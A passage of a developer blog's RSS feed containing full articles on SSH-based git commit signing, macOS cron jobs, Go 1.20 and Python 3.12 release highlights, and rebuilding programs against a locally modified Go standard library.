    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Use your SSH key to sign git objects</h1>
<p><a href="https://github.blog/2021-11-15-highlights-from-git-2-34/">Git 2.34</a> added support for signing git objects, like commits, using an SSH key.
Previously you could only choose between GPG and a X.509 certificate.
Managing GPG keys is quite tedious in my experience, and every time I need to extend one my keys I cannot remember exactly how to do it.
Lowering the bar to set up and maintain a working signing configuration could drive the adoption of git object signing, I think.
Authenticating against a remote repository via SSH is probably the most common option, so most people who use git already have an SSH key available.
Hence, let's use that to sign your git objects!</p>
<p>Configuration is pretty straightforward, all you need to know is the filename of the SSH public key you want to use for signing.
On Linux you can just run <code>ssh-add -L</code> to list the public keys with filename known to your SSH agent.
However, on macOS you won't see filenames in the output.
If you're unsure check your <code>~/.ssh/config</code> or the <code>*.pub</code> keys inside <code>~/.ssh</code>.</p>
<p>After you've figured out which SSH key to use for singing just issue the following commands and you're good to go:</p>
<pre><code class="language-shell">$ git config --global gpg.format ssh
$ git config --global user.signingKey ~/.ssh/some_ssh_key.pub
</code></pre>
<p>Note that <code>~/.ssh/some_ssh_key.pub</code> must be adjusted to your setup, e.g. <code>~/.ssh/id_ed25519.pub</code>.
There's also a <a href="https://docs.github.com/en/authentication/managing-commit-signature-verification/telling-git-about-your-signing-key#telling-git-about-your-ssh-key">GitHub Docs page</a> about the configuration process, in case you still have any questions.</p>
<p>Here's how I check that git object signing works:</p>
<pre><code class="language-shell">$ cd $(mktemp -d)
$ git init
$ git commit --allow-empty --gpg-sign -m 'A test message'
</code></pre>
<p>You're good to go if <code>git commit</code> exits without an error.</p>
<p>Happy signing 🗝️</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>How to setup and debug a cronjob in macOS</title>
      <link>https://klingt.net/articles/how-to-setup-and-debug-a-cronjob-in-macos.html</link>
      <description>A macOS installation comes with cron, so a regular can setup cronjobs.  How to setup a new cron job and how to debug a failing one will be explained in this article.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="A macOS installation comes with cron, so a regular can setup cronjobs.  How to setup a new cron job and how to debug a failing one will be explained in this article.">
  
  <title>How to setup and debug a cronjob in macOS</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>How to setup and debug a cronjob in macOS</h1>
<p>I was surprised to see that macOS comes with cron pre-installed.
A cron job is basically a recurring scheduled task, e.g. a script or command that is run every Tuesday on 2pm.
To check if there any existing cron jobs run:</p>
<pre><code class="language-sh">$ crontab -l
crontab: no crontab for alinz - using an empty one
crontab: no changes made to crontab
</code></pre>
<p>Let's say I want to commit my <a href="https://obsidian.md">Obsidian</a> notes once a day.
First I write a small script that contains the commit logic before I setup the cron job.</p>
<pre><code class="language-bash">$ cat &lt;&lt;&quot;EOD&quot;&gt;~/.local/bin/commit-obsidian-notes.sh &amp;&amp; chmod +x ~/.local/bin/commit-obsidian-notes.sh
#!/usr/bin/env bash

set -eu

pushd ~/Documents/Obsidian
git add --all
git commit -m &quot;Obsidian notes from $(date -Idate)&quot;
popd
EOD
</code></pre>
<p>Note that the script above contains quite a bit of bash magic.
It's perfectly fine to write the script file and set the executable flag in two separate commands.
Also, if you quote the delimiter in a <code>HEREDOC</code> statement, like <code>&quot;EOD&quot;</code> in the example above, then no evaluation happens in the content.
Otherwise the <code>$(date -Idate)</code> would've been evaluated to 2023-04-23 in the script.</p>
<p>Since we have the script our only remaining step is to setup the cron job.
Cron's syntax is a bit intricate and I'd recommend to use an online tool like <a href="https://crontab.guru">crontab.guru</a> to define the desired cron schedule expression.
Running the job every day at 8pm can be expressed as <a href="https://crontab.guru/#0_20_*_*_*"><code>0 20 * * *</code></a>.</p>
<p>To define the job run <code>crontab -e</code> and enter <code>0 20 * * * ~/.local/bin/commit-obsidian-notes.sh</code>.
But there's something missing which will make the cron job fail.
Cron job errors will be reported to your local mail account, yes there's a local mail account for your user account.
To read those mail just run <code>mail</code> in a terminal.
You'll see the following error:</p>
<pre><code>~/Documents/Obsidian ~
fatal: Unable to read current working directory: Operation not permitted
</code></pre>
<p>We need to give <code>/usr/sbin/cron</code> full disk access in order to fix the issue.
Please let me know if there's a way to restrict access of <code>cron</code> just to a particular directory.
Open <code>system settings.app</code>, then <em>Privacy &amp; Security</em> and under <em>Full Disk Access</em> click the <code>+</code> button at the bottom to add <code>/usr/sbin/cron</code>.
Note that you can use <code>Cmd+Shift+G</code> to enter a particular location in the file select dialog (this also works in Finder).</p>
<p>Et voila, you now know how to setup and debug a cron job on macOS.</p>
<p>PS: If your git is configured to automatically sign a commit add <code>--no-gpg-sign</code> to the <code>git commit</code> call or otherwise the cron job will fail because it cannot unlock your signing key.</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Go 1.20, what&#39;s new</title>
      <link>https://klingt.net/articles/go-1-20-what-s-new.html</link>
      <description>An overview over the changes with Go 1.20 that are most interesting for me, and hopefully for you too</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="An overview over the changes with Go 1.20 that are most interesting for me, and hopefully for you too">
  
  <title>Go 1.20, what&#39;s new</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<ul>
<li>Most information was taken from the <a href="https://go.dev/doc/go1.20">release notes</a>.</li>
<li><del>Release is schedules for February 2023.  Releases happened between <a href="https://go.dev/doc/devel/release">16th and 25th in the past</a>, so I assume that 1.20 will be released end of February as well.</del> Final release was on 1st of February 2023, a little bit earlier than usual for an even version number Go release.</li>
<li>I talked about this in our <a href="https://golangleipzig.space/posts/meetup-34-wrapup/">#34 Leipzig Gophers Meetup</a>.</li>
</ul>
<hr>
<h2>Context</h2>
<p>Package <code>context</code> received <a href="https://go.dev/pkg/context/#WithCancelCause"><code>WithCancelCause</code></a> which allows to cancel a context with a given error.  This is pretty nice to have something more meaningful than the usual <code>context.Canceled</code> error, that won't tell you anything about why something got canceled. (<a href="https://go.dev/play/p/dp-sJNfYp-Y">playground</a>)</p>
<h2>Errors</h2>
<p>Support for <strong>wrapping multiple errors</strong>:
- <a href="https://pkg.go.dev/errors@go1.20rc3#Join"><code>errors.Join</code></a> to wrap multiple errors into one (error messages will be newline delimited)
- <code>fmt.Errorf</code> now also supports multiple <code>%w</code> format verbs
- (<a href="https://go.dev/play/p/xSsD6AF_w0p">playground</a>)</p>
<h2>HTTP Response Controller</h2>
<p><a href="https://pkg.go.dev/net/http@go1.20rc3#ResponseController"><strong><code>http.ResponseController</code></strong> </a> wraps an <code>http.ResponseWriter</code> and makes it more convenient to configure it in a Handler, e.g. no need to make checked-cast to an <code>http.Hijacker</code> anymore, just call <code>responseController.Hijack()</code>.  You can also easily overwrite <a href="https://github.com/golang/go/blob/7f59bea53c888605faaa46cd95aaa3ddf29219bf/src/net/http/responsecontroller.go#L84-L96">read</a> and <a href="https://github.com/golang/go/blob/7f59bea53c888605faaa46cd95aaa3ddf29219bf/src/net/http/responsecontroller.go#L104-L116">write deadlines</a> using the response controller.</p>
<h2>Language Changes</h2>
<p><strong>Slice to array conversions</strong> are now a bit easier to write (<a href="https://go.dev/play/p/fVXMR6m6ihu?v=gotip">playground</a>).</p>
<pre><code class="language-go">	x := []int{1, 2, 3, 4}
	var y [4]int
	// Go 1.17+
	// y = *(*[4]int)(x)
	y = [4]int(x)
</code></pre>
<p>Note that this will</p>
<ul>
<li>copy the elements from the slice to the array</li>
<li>conversion from array to slice works the same way</li>
<li>array to slice conversion will run-time panic if the target slice won't fit the array (len(slice) &lt; len(array))</li>
</ul>
<p>Three new functions for <strong>unsafe modification fo slices</strong>, <a href="https://tip.golang.org/ref/spec/#Package_unsafe"><code>SliceData</code>, <code>String</code>, <code>StringData</code></a>.  Don't use it, except you know what you're doing.</p>
<p>The <strong>language specification</strong> now defines that</p>
<ul>
<li>struct values are compared one field at a time, in the order fields were declared in the struct definition</li>
<li><a href="https://go.dev/play/p/ovlSPbbcIrY">array values are compared one element at a time</a>, in increasing index order
<ul>
<li>Note that slices still cannot be checked for equality using the <code>==</code> operator!</li>
</ul>
</li>
<li>comparisons stop at the first mismatch
This will have no effect on existing programs, just a clear description in the spec what was already implemented</li>
</ul>
<p>The <strong><code>comparable</code> constraint</strong> is now satisfied by <a href="https://tip.golang.org/ref/spec#Comparison_operators">comparable types</a>, sound obvious, right 😅?  In practice this means that a <code>comparable</code> constrained type parameter can be instantiated with non-strictly comparable types, like <code>interface</code>s.  As an example, you can do the following from Go 1.20 (<a href="https://go.dev/play/p/lVBUwYionqs?v=gotip">playground</a>):</p>
<pre><code class="language-go">func f[K comparable, V any](keys []K, values []V) map[K]V {
	m := make(map[K]V, len(keys))
	for idx, key := range keys {
		m[key] = values[idx]
	}
	return m
}
</code></pre>
<h2>Tools</h2>
<ul>
<li><strong>Go distribution will become a bit smaller</strong> because pre-compiled packages from the standard library are removed.  Instead, packages of the standard library will be compiled on the fly and then stored in the build cache (like any other package).</li>
<li><code>go test -json</code> will <strong>emit a start <code>Action</code></strong> at the beginning of each test execution.</li>
<li>The <code>go</code> command received a <code>-C</code> flag, to <strong>change working directory</strong>.</li>
<li>Build related commands, <code>go build</code> and <code>go install</code>, received a <code>-cover</code> flag to <strong>build with code coverage instrumentation</strong>.
<em>There will be a separate talk today, that is going to cover this topic in detail.</em></li>
<li><strong><code>net</code> and <code>os/user</code> packages are now pure Go packages under macOS</strong>, i.e. they don't require <code>cgo</code> anymore.</li>
<li><strong><code>cgo</code> is not required anymore for the race-detector under macOS</strong> (you can run those tests now without having XCode installed)</li>
</ul>
<h2>Runtime</h2>
<ul>
<li>Experimental support for arena allocations (<a href="https://github.com/golang/go/issues/51317">language proposal</a>).  Allocations from the memory arena are not considered by the GC and the arena will be freed manually all at once. (<a href="https://docs.go101.org/std/pkg/arena.html">package docs</a>).  Should be handled with care due to easy to introduce use-after-free bugs.</li>
<li>Up to 2% less CPU usage, due to GC improvements.</li>
</ul>
<h2>Compiler</h2>
<ul>
<li>Support for <a href="https://en.wikipedia.org/wiki/Profile-guided_optimization">PGO</a>, <strong>profile guided optimization</strong>, in builds.  This means that the compiler can leverage run-time profile data to optimize the compiled code, e.g. by more aggressive inlining.  Claimed performane improvement are about 3-4%.  More PGO optimizations will be added in further releases.
<ul>
<li>Record a CPU profile and pass that to the compiler.</li>
</ul>
</li>
<li><strong>Up to 10% faster build speeds</strong>, which brings compile times down to pre-generic levels.</li>
<li>There's a Go blog post with more details: <a href="https://go.dev/blog/pgo-preview">https://go.dev/blog/pgo-preview</a></li>
</ul>
<h2>Standard Library</h2>
<ul>
<li><strong>New <code>crypto/ecdh</code> and <code>crypto/ecdsa</code> packages</strong> which replaces the more low-level <code>crypto/elliptic</code>.  Fillipo Valsorda wrote a deep-dive on the <a href="https://words.filippo.io/dispatches/go-1-20-cryptography/">Go 1.20 crypto changes</a>, e.g. the elliptic curve crypto packages don't rely on <code>math/big</code> anymore, which makes them constant time.</li>
<li><a href="https://pkg.go.dev/net/http/httputil@go1.20rc3#ReverseProxy"><strong>ReverseProxy Rewrite hook</strong></a> superceeds <code>httputil.Director</code> and now receives in- and outbound requests with its <code>*httputil.ProxyRequest</code> argument (unlike a Director function which just received an outbound request).</li>
</ul>
<h3>Minor standard library changes</h3>
<ul>
<li><code>archive/tar</code> and <code>archive/zip</code> return <a href="https://go.dev/pkg/archive/zip/#ErrInsecurePath"><code>ErrInsecurePath</code></a> if an entry has an absolute path, contains invalid characters etc.  Note that this is currently behind a feature flag, <code>GODEBUG=zipinsecurepath=0</code> but might get the default in a future release.</li>
<li>the <code>bytes</code> package received
<ul>
<li><a href="https://github.com/golang/go/blob/518889b35cb07f3e71963f2ccfc0f96ee26a51ce/src/bytes/bytes.go#L1352-L1360"><code>Clone</code></a>, which basically returns a clone of the given byte slice.  This is a useful utitlity with a pretty minimal implementation.</li>
<li><code>TrimPrefix</code> and <code>TrimSuffix</code> got siblings, called <code>CutPrefix</code> and <code>CutSuffix</code>.  The difference is that the <code>Cut</code> functions will return if something was removed or not.</li>
</ul>
</li>
<li><code>crypto/tls</code> TLS certificates are now shared across all clients using a certificate, which might lead to significantly less memory usage.  If a handshake fails a new <a href="https://go.dev/pkg/crypto/tls/#CertificateVerificationError"><code>CertificateVerificationError</code></a> is returned.</li>
<li><a href="https://pkg.go.dev/io#OffsetWriter"><code>io.OffsetWriter</code></a> basically wraps an <code>io.WriterAt</code> and adds a given fixed offset to each Seek, Write etc. call.</li>
<li>Directory trees are usually traversed using <code>fs.Walk</code>.  There's a new <code>SkipAll</code> error that can be used to immediately stop the recursion of <code>fs.Walk</code>, but this error will be consumed and the call will end successfully.  This is mostly for convenience, since you could have achieved the same before, just that the caller had to filter out the custom error that indicates the traversal stop.</li>
<li><code>math/rand</code> will <a href="https://github.com/golang/go/blob/518889b35cb07f3e71963f2ccfc0f96ee26a51ce/src/math/rand/rand.go#L323-L334">automatically seed the global RNG</a>, this can deactivated with <code>GODEBUG=randautoseed=0</code>.  I'd argue against using the global RNG and to always instantiate a local instance.  The same applies to any other global instance.</li>
<li>We got three new time formats:
<ul>
<li><code>DateTime   = &quot;2006-01-02 15:04:05&quot;</code></li>
<li><code>DateOnly   = &quot;2006-01-02&quot;</code></li>
<li><code>TimeOnly   = &quot;15:04:05&quot;</code></li>
</ul>
</li>
<li><code>testing.B</code> can now report the <a href="https://go.dev/pkg/testing/#B.Elapsed">elapsed time</a></li>
</ul>
<h3>Future</h3>
<ul>
<li>There's a <a href="https://github.com/golang/go/issues/56345">proposal</a> to add structured logging support to the standard library with package <a href="https://go.googlesource.com/proposal/+/master/design/56345-structured-logging.md"><code>log/slog</code></a></li>
<li>Can be used already by importing <a href="https://pkg.go.dev/golang.org/x/exp/slog"><code>golang.org/x/exp/slog</code></a></li>
<li>Currently
<ul>
<li>we only have package <a href="https://pkg.go.dev/log"><code>log</code></a>,  a simple logger that has no support for levels etc.</li>
<li>every logging library needs to define their own <code>Logger</code> interface</li>
</ul>
</li>
<li>At a high level <code>slog</code> is build from three parts:
<ul>
<li><a href="https://pkg.go.dev/golang.org/x/exp/slog#Logger">Logger</a> is user-facing part of the API, exposing methods like <code>.Info()</code> or <code>.Error()</code>.
<blockquote>
<p>A Logger records structured information about each call to its Log, Debug, Info, Warn, and Error methods. For each call, it creates a Record and passes it to a Handler.</p>
</blockquote>
</li>
<li><a href="https://pkg.go.dev/golang.org/x/exp/slog#Record">Record</a> contains data of a logging even.
<blockquote>
<p>A Record holds information about a log event. Copies of a Record share state. Do not modify a Record after handing out a copy to it.</p>
</blockquote>
</li>
<li><a href="https://pkg.go.dev/golang.org/x/exp/slog#Handler">Handler</a> is a logging backend implementation, that handles records emitted from a Logger.
<blockquote>
<p>A Handler handles log records produced by a Logger.
A typical handler may print log records to standard error, or write them to a file or database, or perhaps augment them with additional attributes and pass them on to another handler.</p>
</blockquote>
</li>
</ul>
</li>
<li><a href="https://go.dev/play/p/FewCi4X-JSu">playground</a>, copied from this article: <a href="https://mrkaran.dev/posts/structured-logging-in-go-with-slog/">https://mrkaran.dev/posts/structured-logging-in-go-with-slog/</a></li>
</ul>
<hr>


      </main>
    </di
        build   vcs.time=202]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>How to build against a modified version of Go</title>
      <link>https://klingt.net/articles/how-to-build-against-a-modified-version-of-go.html</link>
      <description>How to build your program against a modified build of the Go standard library.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="How to build your program against a modified build of the Go standard library.">
  
  <title>How to build against a modified version of Go</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>How to build against a modified version of Go</h1>
<p>This week I read <a href="https://jazco.dev/2024/01/10/golang-and-epoll/">an article</a> about the vertical scaling limits of a Go application under heavy I/O load, that linked to <a href="https://github.com/golang/go/issues/65064">a Go issue</a> in which the <code>syscall.EpollWait</code> bottleneck is investigated. One particular <a href="https://github.com/golang/go/issues/65064#issuecomment-1887777889">comment</a> in this issue thread sparked my interest, it says:</p>
<blockquote>
<p>Note that is possible to simply edit the runtime source in GOROOT and rebuild your program (no special steps required for the runtime, it is treated like any other package).</p>
</blockquote>
<p>What this means is, that any import of standard library packages is handled as if they're user packages, just that the standard library packages are resolved with <code>$GOROOT/src</code> as the base directory. Also, it's a little bit more complicated than the comment makes it look like, but we'll come to that.
With this knowledge, let's try what is needed to run a Go program with a custom Go build.</p>
<p>The following steps assume that a Go distribution is already available on your system.
Let's create a simple hello-world Go app:</p>
<pre><code class="language-sh">$ mkdir app &amp;&amp; cd app
$ go mod init example.com/hello-app
</code></pre>
<p>Where <code>hello.go</code> contains the following lines:</p>
<pre><code class="language-go">package main

import &quot;fmt&quot;

func main() {
	fmt.Println(&quot;World!&quot;)
}
</code></pre>
<p>Running <code>go run hello.go</code> will, obviously, print <code>World!</code> to the console.</p>
<p>My contrived example will modify <code>fmt.Println</code> in a way that it always puts a <code>Hello,</code> before everything it prints. I know, a horrible idea, but nobody says you should ship something like this in production 😛.</p>
<p>We need to clone a source copy of Go into some local folder, in this case I use <code>_go</code>, because the <a href="https://pkg.go.dev/cmd/go"><code>go</code> tool</a> ignores folders that are prefixed with either <code>_</code> or <code>.</code>.</p>
<pre><code class="language-sh">$ git clone --depth 1 --branch go1.21.6 git@github.com:golang/go _go
</code></pre>
<p>Now we need to build the <code>go</code> tool from the cloned source:</p>
<pre><code class="language-sh">pushd _go/src/go &amp;&amp; ./make.bash; popd
</code></pre>
<p>If you forget to do this you'll see an error like</p>
<pre><code class="language-sh">go: no such tool &quot;compile&quot;
</code></pre>
<p>when trying to compile against your modified Go version.
A slight environment modifications is necessary so that the custom <code>go</code> build is picked up:</p>
<pre><code class="language-sh">export GOROOT=$PWD/_go
export PATH=$GOROOT/bin:$PATH
</code></pre>
<p>With this done let's modify <code>$GOROOT/src/fmt/print.go</code> as shown in this diff:</p>
<pre><code class="language-diff">diff --git a/src/fmt/print.go b/src/fmt/print.go
index 9c3bd3e..3a83a99 100644
--- a/src/fmt/print.go
+++ b/src/fmt/print.go
@@ -301,6 +301,7 @@ func Append(b []byte, a ...any) []byte {
 // It returns the number of bytes written and any write error encountered.
 func Fprintln(w io.Writer, a ...any) (n int, err error) {
 	p := newPrinter()
+	p.doPrint([]any{&quot;Hello,&quot;})
 	p.doPrintln(a)
 	n, err = w.Write(p.buf)
 	p.free()
</code></pre>
<p>Another run of <code>go run hello.go</code> will now print <code>Hello,World!</code>.
Success 🎉!</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Python 3.12</title>
      <link>https://klingt.net/articles/python-3-12.html</link>
      <description>My summary of the Python 3.12 release highlights.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="My summary of the Python 3.12 release highlights.">
  
  <title>Python 3.12</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Yet another Python 3.12 release highlight summary</h1>
<p>I'm doing a fair bit of Python lately, and thus need to stay up-to-date with the language releases.  Some days ago Python 3.12 was released.  The <a href="https://www.python.org/downloads/release/python-3120/">release note overview</a>, and the detailed <a href="https://docs.python.org/3.12/whatsnew/3.12.html">release notes</a> in particular, are worth a read.  Other articles I can recommend are <a href="https://www.bitecode.dev/p/python-312-what-didnt-make-the-headlines">What didn't make the headlines</a> and <a href="https://realpython.com/python312-typing/">Static typing improvements</a>.</p>
<ul>
<li><a href="https://peps.python.org/pep-0701/">PEP-701</a> formalisation of f-strings will lift some limitations, like nested f-strings, use of the quotation delimiter of the f-strings inside an expression, comments in multi-line f-strings. Examples are listed in the PEP.</li>
</ul>
<pre><code class="language-python">&gt;&gt;&gt; m = {'a': 'b'}
# This wasn't possible in prior versions.
&gt;&gt;&gt; f'm={m['a']}'
'm=b'
</code></pre>
<p>Since Python3.8 there's also a debug format in f-strings, that is used when post-fixing a variable with <code>=</code>:</p>
<pre><code class="language-python">&gt;&gt;&gt; f'{m=}'
&quot;m={'a': 'b'}&quot;
# or as nested f-string
&gt;&gt;&gt; f'Debug output {f'{m=}'}'
&quot;Debug output m={'a': 'b'}&quot;
</code></pre>
<ul>
<li><a href="https://docs.python.org/3.12/whatsnew/3.12.html#pep-688-making-the-buffer-protocol-accessible-in-python">PEP 688</a> exposes the <em>Buffer protocol</em> (interface) to Python code.  This was limited to CPython before. I'm not sure what this is useful for.</li>
<li><a href="https://peps.python.org/pep-0669/">PEP 669</a> introduces a new, low-overhead debugging and profiling API.</li>
<li><a href="https://peps.python.org/pep-0684">PEP 684</a> adds support for isolated sub-interpreters with separate GILs, and is only available through the C-API. So, not of any particular use for me.</li>
<li><a href="https://docs.python.org/3.12/whatsnew/3.12.html#improved-error-messages">Improved error messages</a>.</li>
<li>Large and small <a href="https://docs.python.org/3.12/whatsnew/3.12.html#optimizations">performance improvements</a>, enhanced <a href="https://docs.python.org/3.12/howto/perf_profiling.html">Linux <code>perf</code> support</a>.</li>
<li><a href="https://peps.python.org/pep-0695/">PEP 695</a> adds a new type annotation syntax.</li>
</ul>
<p>More compact way to create generic functions and classes:</p>
<pre><code class="language-python">def max[T](args: Iterable[T]) -&gt; T:
	...
</code></pre>
<p>Type aliases can be generic:</p>
<pre><code class="language-python">type Point[T] = tuple[T, T]
</code></pre>
<ul>
<li><a href="https://docs.python.org/3.12/whatsnew/3.12.html#pep-698-override-decorator-for-static-typing">PEP 698</a> adds a <code>@override</code> decorator to indicate methods that should be overridden in a sub-class.</li>
<li>The <code>sqlite3</code> module received a <a href="https://docs.python.org/3.12/library/sqlite3.html#sqlite3-cli">command-line interface</a>.  This might be useful as a simple SQLite interface on systems that only have Python available.</li>
</ul>
<pre><code class="language-bash"># python -m sqlite3 [-h] [-v] [filename] [sql]
$ python -m sqlite3
sqlite3 shell, running on SQLite version 3.39.5
Connected to a transient in-memory database

Each command will be run using execute() on the cursor.
Type &quot;.help&quot; for more information; type &quot;.quit&quot; or CTRL-D to quit.
sqlite&gt;
</code></pre>
<ul>
<li>The <code>uuid</code> package receive a <a href="https://docs.python.org/3.12/library/uuid.html#uuid-cli">CLI</a> as well. Now there's an easy cross-platform way to create UUIDs!</li>
</ul>
<pre><code class="language-python3"># python -m uuid [-h] [-u {uuid1,uuid3,uuid4,uuid5}] [-n NAMESPACE] [-N NAME]
$ python -m uuid -u uuid4
6ebeb0e2-6257-4eba-a638-97a20a222bed
</code></pre>
<ul>
<li><a href="https://docs.python.org/3.12/library/itertools.html#itertools.batched"><code>itertools.batched</code></a> will be very useful for splitting workloads into evenly sized chunks.</li>
</ul>
<pre><code class="language-python">&gt;&gt;&gt; from itertools import batched
&gt;&gt;&gt; files = [f'{i}.txt' for i in range(1,11)]
&gt;&gt;&gt; list(batched(files, 3))
[('1.txt', '2.txt', '3.txt'), ('4.txt', '5.txt', '6.txt'), ('7.txt', '8.txt', '9.txt'), ('10.txt',)]
</code></pre>
<ul>
<li>There's now <code>pathlib.Path</code> directory traversal function <a href="https://docs.python.org/3.12/library/pathlib.html#pathlib.Path.walk"><code>pathlib.Path.walk</code></a>.</li>
<li><a href="https://docs.python.org/3.12/library/os.path.html#os.path.splitroot"><code>os.path.splitroot</code></a> splits a path into a three tuple of <code>(drive, root, tail)</code> where <code>drive</code> is always empty on POSIX systems.</li>
</ul>
<pre><code class="language-python"># POSIX
&gt;&gt;&gt; os.path.splitroot(os.getcwd())
('', '/', 'Users/someuser')
# Windows
('C:', '\\', 'Users\\someuser\\AppData\\Local\\Programs\\Python\\Python312')
</code></pre>
<ul>
<li><a href="https://docs.python.org/3.12/library/tempfile.html#tempfile.NamedTemporaryFile"><code>tempfile.NamedTemporaryFile</code></a> received a boolean <code>delete_on_close</code> argument, which should be self-explanatory.</li>
<li><a href="https://docs.python.org/3.12/library/tempfile.html#tempfile.mkdtemp"><code>tempfile.mkdtemp</code></a> always returns an absolute path now.</li>
<li>Module <code>unittest</code> received a <code>--durations=N</code> flag to show the <code>N</code> slowest test cases.</li>
<li><a href="https://www.bitecode.dev/p/python-312-what-didnt-make-the-headlines#%C2%A7a-better-debugging-experience">Inlined return values can be accessed in a debugger session</a>, without adding a intermediate variable.</li>
</ul>
<pre><code class="language-python"># module.py
def g():
    return 21*2

def f():
    breakpoint()
    return g()

f()
</code></pre>
<p>Here's how to show the return value:</p>
<pre><code>$ python -m module
&gt; /private/var/folders/mc/3ssj7_c51dv76d6ll79s5l3w0000gn/T/tmp.xHdeQkAESD/module.py(6)f()
-&gt; return g()
(Pdb) n
--Return--
&gt; /private/var/folders/mc/3ssj7_c51dv76d6ll79s5l3w0000gn/T/tmp.xHdeQkAESD/module.py(6)f()-&gt;42
-&gt; return g()
(Pdb) $_retval
42
